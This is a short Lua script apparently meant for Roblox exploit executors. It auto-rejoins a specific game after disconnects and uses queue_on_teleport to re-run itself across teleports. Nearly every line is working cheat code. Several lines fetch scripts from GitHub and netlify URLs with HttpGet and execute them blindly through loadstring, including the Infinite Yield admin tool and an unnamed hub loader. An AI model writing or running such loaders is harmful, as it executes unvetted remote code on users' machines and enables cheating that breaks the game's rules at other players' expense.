repeat wait() until game:IsLoaded()
print("Roblox loaded")
wait(30)

game.NetworkClient.ChildRemoved:Connect(function()
    if game.PlaceId == 16732694052 then
        game:GetService("TeleportService"):Teleport(16732694052)
    end
end)

queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or (delta and delta.queue_on_teleport)
local TeleportCheck = false
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
if (not TeleportCheck) and queueteleport then
    TeleportCheck = true
    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/AyoItsHanee/main/main/fscx.lua'))()")
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
wait(5)
loadstring(game:HttpGet("https://bonkhubloader.netlify.app",true))()
